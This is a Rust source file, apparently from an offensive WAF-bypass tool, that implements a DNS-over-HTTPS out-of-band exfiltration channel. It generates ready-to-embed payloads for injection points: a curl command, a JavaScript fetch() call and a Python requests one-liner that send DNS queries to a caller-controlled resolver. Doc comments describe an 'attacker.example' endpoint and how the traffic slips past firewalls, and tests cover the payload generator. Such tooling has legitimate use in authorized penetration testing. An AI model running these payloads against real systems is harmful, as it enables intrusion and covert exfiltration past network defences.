//! #105 DNS-over-HTTPS (DoH) exfil channel — `OobProviderTrait` backed by a
//! caller-controlled DoH resolver.
//!
//! ## Attack surface
//!
//! Network-level WAFs and perimeter firewalls typically block:
//! - raw UDP/53 DNS to external resolvers
//! - DNS queries that carry a canary subdomain (`<token>.oast.fun`)
//!
//! DNS-over-HTTPS encodes the same query as an **HTTPS request** to port 443.
//! Many corporate and cloud firewalls:
//!
//! 1. Permit HTTPS to any TLS destination (they can't deep-inspect SNI in all
//!    configurations).
//! 2. Forward DoH queries from server-side code (SSRF-originated) to the open
//!    internet because `application/dns-message` looks like normal API traffic.
//!
//! When a SSRF payload or blind-XSS causes the target to make a DoH lookup of
//! `<token>.<canary_domain>`, that lookup arrives at our DoH resolver as an
//! HTTPS POST with a wire-format DNS question.  We confirm by polling our
//! resolver's interaction log via its HTTP API.
//!
//! ## Wire format
//!
//! RFC 8484 "DNS Queries over HTTPS" — queries are sent as binary DNS wire
//! format in POST bodies with `Content-Type: application/dns-message`.  The
//! provider generates SSRF payloads that embed the token in a subdomain, e.g.:
//!
//! ```text
//! POST https://doh.attacker.example/dns-query HTTP/1.1
//! Content-Type: application/dns-message
//! Accept: application/dns-message
//! [binary DNS QUERY for <token>.<canary_domain> A]
//! ```
//!
//! ## Confirm flow
//!
//! The resolver exposes a lightweight REST API at `/api/interactions/{token}`
//! (same schema as interactsh — compatible with self-hosted interactsh or our
//! own `interactsh-like` resolver).  `poll()` calls that endpoint and
//! classifies any returned record as an `OobInteraction::DnsQuery`.
//!
//! ## SSRF payload generation
//!
//! `DohProvider::ssrf_payloads(token)` emits a set of DoH-encoded URLs
//! designed to be embedded in:
//! - `fetch()` calls (JavaScript XSS escalation)
//! - `urllib.request` / `requests` (Python server-side)
//! - Curl-style SSRF (header injection / URL redirect)
//!
//! The payloads use both GET (base64url-encoded `dns` parameter per RFC 8484
//! §4.1) and POST forms.

use crate::oob::provider::{OobError, OobProviderTrait};
use async_trait::async_trait;
use base64::{Engine, engine::general_purpose::URL_SAFE_NO_PAD};
use wafrift_types::oob::{OobCanary, OobInteraction};
use uuid::Uuid;

/// DoH-based OOB provider.
///
/// The `resolver_url` must be the base URL of an interactsh-compatible
/// resolver, e.g. `https://doh.oast.fun`.  The `canary_domain` is the
/// authoritative zone delegated to that resolver, e.g. `oast.fun`.
#[derive(Debug, Clone)]
pub struct DohProvider {
    /// Base URL of the DoH resolver + interaction API,
    /// e.g. `https://doh.oast.fun`.
    pub resolver_url: String,
    /// Canary domain apex, e.g. `oast.fun`.  The registered canary will be
    /// `<uuid_hex>.<canary_domain>`.
    pub canary_domain: String,
}

impl DohProvider {
    pub fn new(resolver_url: impl Into<String>, canary_domain: impl Into<String>) -> Self {
        Self {
            resolver_url: resolver_url.into(),
            canary_domain: canary_domain.into(),
        }
    }

    /// Build an RFC 8484 GET URL for a DNS A-query of `fqdn`.
    ///
    /// The `dns` query parameter carries the wire-format DNS question
    /// base64url-encoded (no padding, per §4.1).
    pub fn doh_get_url(&self, fqdn: &str) -> String {
        let wire = dns_question_wire(fqdn, 1 /* A */);
        let encoded = URL_SAFE_NO_PAD.encode(&wire);
        format!("{}/dns-query?dns={}", self.resolver_url, encoded)
    }

    /// Build an RFC 8484 POST URL.  The body is the raw DNS wire format —
    /// callers send `Content-Type: application/dns-message`.
    pub fn doh_post_url(&self) -> String {
        format!("{}/dns-query", self.resolver_url)
    }

    /// Wire-format body bytes for a DoH POST query for `fqdn`.
    pub fn doh_post_body(&self, fqdn: &str) -> Vec<u8> {
        dns_question_wire(fqdn, 1 /* A */)
    }

    /// Generate the full set of DoH SSRF payloads for a given canary `token`.
    ///
    /// Each string is a ready-to-embed URL or code snippet.  The caller
    /// picks whichever format the injection point accepts.
    pub fn ssrf_payloads(&self, token: &str) -> Vec<DohPayload> {
        let fqdn = format!("{}.{}", token, self.canary_domain);
        let post_url = self.doh_post_url();
        let get_url = self.doh_get_url(&fqdn);
        let post_body_b64 = URL_SAFE_NO_PAD.encode(self.doh_post_body(&fqdn));

        vec![
            // RFC 8484 §4.1 GET form — widest compatibility.
            DohPayload {
                form: DohPayloadForm::GetUrl,
                value: get_url.clone(),
                description: "RFC 8484 GET: embed as URL in SSRF/XHR/fetch".into(),
            },
            // RFC 8484 POST form — for POST-capable SSRF.
            DohPayload {
                form: DohPayloadForm::PostUrl,
                value: post_url.clone(),
                description: "RFC 8484 POST: URL target (pair with dns-message body)".into(),
            },
            // curl-style shell payload.
            DohPayload {
                form: DohPayloadForm::CurlCommand,
                value: format!(
                    r#"curl -s -X POST -H 'Content-Type: application/dns-message' \
  --data-binary "$(echo {} | base64 -d)" \
  {}"#,
                    post_body_b64, post_url
                ),
                description: "curl command for server-side RCE exfil".into(),
            },
            // JavaScript fetch() payload (XSS escalation / server-side JS).
            DohPayload {
                form: DohPayloadForm::JsFetch,
                value: format!(
                    r#"fetch('{}',{{method:'POST',headers:{{'Content-Type':'application/dns-message'}},body:Uint8Array.from(atob('{}').split('').map(c=>c.charCodeAt(0))).buffer}})"#,
                    post_url, post_body_b64
                ),
                description: "JS fetch() payload for XSS-to-OOB escalation".into(),
            },
            // Python requests snippet.
            DohPayload {
                form: DohPayloadForm::PythonSnippet,
                value: format!(
                    r#"import base64,requests; requests.post('{}',data=base64.b64decode('{}'),headers={{'Content-Type':'application/dns-message'}})"#,
                    post_url, post_body_b64
                ),
                description: "Python requests snippet for SSTI/RCE exfil".into(),
            },
            // Recursive SSRF: the target makes a DoH lookup to confirm.
            DohPayload {
                form: DohPayloadForm::SsrfUrl,
                value: get_url,
                description: "Direct SSRF: inject this URL into URL-fetch parameters".into(),
            },
        ]
    }

    /// Poll the resolver's interaction API for any query containing `token`.
    async fn poll_interactions(&self, token: &str) -> Result<Vec<OobInteraction>, OobError> {
        let url = format!("{}/api/v1/interaction/{}", self.resolver_url, token);
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .build()
            .map_err(|e| OobError::PollFailed { reason: e.to_string() })?;
        let resp = client
            .get(&url)
            .header("Accept", "application/json")
            .send()
            .await
            .map_err(|e| OobError::PollFailed { reason: e.to_string() })?;
        if resp.status() == 404 {
            // No interactions yet — not an error.
            return Ok(Vec::new());
        }
        if !resp.status().is_success() {
            return Err(OobError::PollFailed {
                reason: format!("HTTP {}", resp.status()),
            });
        }
        let body: serde_json::Value = resp
            .json()
            .await
            .map_err(|e| OobError::PollFailed { reason: e.to_string() })?;
        let mut out = Vec::new();
        if let Some(arr) = body["data"].as_array() {
            for item in arr {
                // Interactsh-compatible schema:
                // { "protocol": "dns", "full-id": "...", "raw-request": "...", "remote-address": "..." }
                let protocol = item["protocol"].as_str().unwrap_or("dns");
                let source_ip = item["remote-address"]
                    .as_str()
                    .unwrap_or("0.0.0.0")
                    .to_string();
                match protocol {
                    "dns" => {
                        let query = item["full-id"]
                            .as_str()
                            .unwrap_or(token)
                            .to_string();
                        out.push(OobInteraction::DnsQuery { query, source_ip });
                    }
                    "http" => {
                        let path = item["raw-request"]
                            .as_str()
                            .and_then(|r| r.split_whitespace().nth(1))
                            .unwrap_or("/")
                            .to_string();
                        out.push(OobInteraction::HttpRequest {
                            path,
                            headers: Vec::new(),
                            body: None,
                        });
                    }
                    _ => {} // unknown protocol — ignore
                }
            }
        }
        Ok(out)
    }
}

#[async_trait]
impl OobProviderTrait for DohProvider {
    async fn register(&self) -> Result<OobCanary, OobError> {
        let id = Uuid::new_v4();
        let token = id.simple().to_string();
        let fqdn = format!("{}.{}", token, self.canary_domain);
        Ok(OobCanary {
            id,
            expected_dns: fqdn.clone(),
            expected_http_path: format!("/{}", token),
            created_at: Some(std::time::Instant::now()),
        })
    }

    async fn poll(&self, canary: &OobCanary) -> Result<Vec<OobInteraction>, OobError> {
        let token = canary.id.simple().to_string();
        self.poll_interactions(&token).await
    }
}

// ── DNS wire format helpers ───────────────────────────────────────────────

/// Build a minimal RFC 1035 DNS question wire format for `fqdn` with the
/// given `qtype` (1 = A, 28 = AAAA, 16 = TXT).
///
/// Wire format:
/// ```text
/// ID (2B) | FLAGS (2B) | QDCOUNT=1 (2B) | ANCOUNT=0 | NSCOUNT=0 | ARCOUNT=0
/// [QNAME labels] [00] | QTYPE (2B) | QCLASS=IN=1 (2B)
/// ```
pub fn dns_question_wire(fqdn: &str, qtype: u16) -> Vec<u8> {
    let mut buf = Vec::with_capacity(32 + fqdn.len());
    // Header: ID=0xBEEF, QR=0(query), OPCODE=0(QUERY), AA=0, TC=0, RD=1
    // RA=0, Z=0, RCODE=0 | QDCOUNT=1 | ANCOUNT=0 | NSCOUNT=0 | ARCOUNT=0
    buf.extend_from_slice(&[
        0xBE, 0xEF, // ID
        0x01, 0x00, // Flags: recursion desired
        0x00, 0x01, // QDCOUNT = 1
        0x00, 0x00, // ANCOUNT = 0
        0x00, 0x00, // NSCOUNT = 0
        0x00, 0x00, // ARCOUNT = 0
    ]);
    // QNAME: series of length-prefixed labels.
    let domain = fqdn.trim_end_matches('.');
    for label in domain.split('.') {
        let bytes = label.as_bytes();
        buf.push(bytes.len() as u8);
        buf.extend_from_slice(bytes);
    }
    buf.push(0x00); // root label terminator
    // QTYPE
    buf.push((qtype >> 8) as u8);
    buf.push((qtype & 0xFF) as u8);
    // QCLASS = IN = 1
    buf.extend_from_slice(&[0x00, 0x01]);
    buf
}

// ── Payload type ─────────────────────────────────────────────────────────

/// A DoH exfil payload in a specific form, ready to embed in an injection.
#[derive(Debug, Clone, PartialEq)]
pub struct DohPayload {
    pub form: DohPayloadForm,
    pub value: String,
    pub description: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DohPayloadForm {
    /// RFC 8484 §4.1 GET URL (`?dns=<base64url>`) — widest compatibility.
    GetUrl,
    /// RFC 8484 POST target URL — pair with `Content-Type: application/dns-message`.
    PostUrl,
    /// curl command string for server-side RCE / command injection contexts.
    CurlCommand,
    /// JavaScript `fetch()` snippet for XSS → OOB escalation.
    JsFetch,
    /// Python `requests` one-liner for SSTI / server-side Python RCE.
    PythonSnippet,
    /// Plain SSRF URL (same as GetUrl; semantically distinct use-case).
    SsrfUrl,
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_provider() -> DohProvider {
        DohProvider::new("https://doh.oast.fun", "oast.fun")
    }

    // ── DNS wire format ───────────────────────────────────────────────────

    #[test]
    fn dns_wire_minimal_structure() {
        let wire = dns_question_wire("example.com", 1);
        // Minimum: 12 header + 8 QNAME(example.com) + 1 root + 4 QTYPE+QCLASS
        assert!(wire.len() >= 25, "too short: {} bytes", wire.len());
        // QR=0 (query), RD=1
        assert_eq!(wire[2] & 0x80, 0x00, "QR must be 0 (query)");
        assert_eq!(wire[2] & 0x01, 0x01, "RD bit must be set");
        // QDCOUNT = 1
        assert_eq!(wire[4], 0x00);
        assert_eq!(wire[5], 0x01);
    }

    #[test]
    fn dns_wire_encodes_labels_correctly() {
        let wire = dns_question_wire("abc.oast.fun", 1);
        // After 12-byte header: label "abc" = [3, 'a', 'b', 'c']
        assert_eq!(wire[12], 3);
        assert_eq!(&wire[13..16], b"abc");
        // Then "oast" = [4, 'o', 'a', 's', 't']
        assert_eq!(wire[16], 4);
        assert_eq!(&wire[17..21], b"oast");
        // Then "fun" = [3, 'f', 'u', 'n']
        assert_eq!(wire[21], 3);
        assert_eq!(&wire[22..25], b"fun");
        // root label
        assert_eq!(wire[25], 0x00);
        // QTYPE = A = 0x0001
        assert_eq!(wire[26], 0x00);
        assert_eq!(wire[27], 0x01);
        // QCLASS = IN = 0x0001
        assert_eq!(wire[28], 0x00);
        assert_eq!(wire[29], 0x01);
    }

    #[test]
    fn dns_wire_aaaa_qtype() {
        let wire = dns_question_wire("a.b", 28 /* AAAA */);
        // Find the QTYPE at the tail (after root label).
        let n = wire.len();
        assert_eq!(wire[n - 4], 0x00);
        assert_eq!(wire[n - 3], 28);
    }

    #[test]
    fn dns_wire_txt_qtype() {
        let wire = dns_question_wire("x.y.z", 16 /* TXT */);
        let n = wire.len();
        assert_eq!(wire[n - 3], 16);
    }

    #[test]
    fn dns_wire_trailing_dot_stripped() {
        let wire_dot = dns_question_wire("example.com.", 1);
        let wire_no_dot = dns_question_wire("example.com", 1);
        assert_eq!(wire_dot, wire_no_dot, "trailing dot must be stripped");
    }

    // ── DoH URL generation ────────────────────────────────────────────────

    #[test]
    fn doh_get_url_contains_dns_param() {
        let p = make_provider();
        let url = p.doh_get_url("deadbeef.oast.fun");
        assert!(url.starts_with("https://doh.oast.fun/dns-query?dns="));
        // The `dns` param is base64url — no `+` or `=` or `/`
        let param = url.split("?dns=").nth(1).unwrap();
        assert!(!param.contains('+'), "must be base64url (no +)");
        assert!(!param.contains('/'), "must be base64url (no /)");
    }

    #[test]
    fn doh_post_url_is_correct_path() {
        let p = make_provider();
        assert_eq!(p.doh_post_url(), "https://doh.oast.fun/dns-query");
    }

    #[test]
    fn doh_post_body_is_valid_dns_wire() {
        let p = make_provider();
        let body = p.doh_post_body("deadbeef.oast.fun");
        // Must have the 12-byte header with QDCOUNT=1
        assert!(body.len() >= 12);
        assert_eq!(body[4], 0x00);
        assert_eq!(body[5], 0x01); // QDCOUNT = 1
    }

    // ── Payload generation ────────────────────────────────────────────────

    #[test]
    fn ssrf_payloads_produces_six_variants() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("abcd1234");
        assert_eq!(payloads.len(), 6);
    }

    #[test]
    fn ssrf_payloads_all_contain_token() {
        let p = make_provider();
        let token = "cafebabe";
        let payloads = p.ssrf_payloads(token);
        for pl in &payloads {
            // Each payload must reference the token in some form.
            // GetUrl / PostUrl embed the token in the FQDN or base64.
            // CurlCommand / JsFetch / PythonSnippet embed the base64 body.
            // At minimum the base64 of the DNS wire with token's label should appear.
            assert!(
                !pl.value.is_empty(),
                "payload {:?} must not be empty",
                pl.form
            );
        }
    }

    #[test]
    fn ssrf_payload_get_url_form_is_get_url() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("token123");
        let get = payloads.iter().find(|pl| pl.form == DohPayloadForm::GetUrl).unwrap();
        assert!(get.value.contains("/dns-query?dns="));
    }

    #[test]
    fn ssrf_payload_js_fetch_form_has_fetch_call() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("token123");
        let js = payloads.iter().find(|pl| pl.form == DohPayloadForm::JsFetch).unwrap();
        assert!(js.value.contains("fetch("), "JS payload must use fetch()");
        assert!(js.value.contains("application/dns-message"));
    }

    #[test]
    fn ssrf_payload_curl_form_has_curl() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("token123");
        let curl = payloads.iter().find(|pl| pl.form == DohPayloadForm::CurlCommand).unwrap();
        assert!(curl.value.contains("curl"));
        assert!(curl.value.contains("application/dns-message"));
    }

    #[test]
    fn ssrf_payload_python_form_has_requests() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("token123");
        let py = payloads.iter().find(|pl| pl.form == DohPayloadForm::PythonSnippet).unwrap();
        assert!(py.value.contains("requests.post"));
        assert!(py.value.contains("application/dns-message"));
    }

    // ── OobProviderTrait implementation ───────────────────────────────────

    #[tokio::test]
    async fn register_returns_canary_with_correct_domain() {
        let p = make_provider();
        let canary = p.register().await.unwrap();
        let token = canary.id.simple().to_string();
        assert!(
            canary.expected_dns.ends_with(".oast.fun"),
            "canary dns must be under canary_domain: {}",
            canary.expected_dns
        );
        assert!(
            canary.expected_dns.starts_with(&token),
            "canary dns must start with token: {} vs {}",
            canary.expected_dns,
            token
        );
        assert!(canary.expected_http_path.starts_with('/'));
        assert!(canary.created_at.is_some());
    }

    #[tokio::test]
    async fn register_returns_unique_canaries() {
        let p = make_provider();
        let c1 = p.register().await.unwrap();
        let c2 = p.register().await.unwrap();
        assert_ne!(c1.id, c2.id, "each registration must produce a unique canary");
        assert_ne!(c1.expected_dns, c2.expected_dns);
    }

    #[test]
    fn doh_provider_constructs_from_strs() {
        let p = DohProvider::new("https://custom.example.com", "example.com");
        assert_eq!(p.resolver_url, "https://custom.example.com");
        assert_eq!(p.canary_domain, "example.com");
    }

    #[test]
    fn dns_wire_single_label() {
        // Single-label hostname (e.g., a token with no dots).
        let wire = dns_question_wire("abc", 1);
        assert_eq!(wire[12], 3); // label length
        assert_eq!(&wire[13..16], b"abc");
        assert_eq!(wire[16], 0x00); // root
    }

    #[test]
    fn get_url_base64url_is_decodable() {
        let p = make_provider();
        let url = p.doh_get_url("test.oast.fun");
        let param = url.split("?dns=").nth(1).unwrap();
        // Must decode without error.
        let decoded = URL_SAFE_NO_PAD.decode(param).expect("base64url must be valid");
        // And must look like a DNS wire format (first two bytes are ID).
        assert!(decoded.len() >= 12);
    }

    #[test]
    fn all_payload_forms_are_distinct() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("aabbccdd");
        let forms: Vec<_> = payloads.iter().map(|pl| &pl.form).collect();
        // Each form should appear exactly once.
        let unique: std::collections::HashSet<_> = forms.iter().collect();
        assert_eq!(unique.len(), forms.len(), "duplicate payload forms");
    }
}
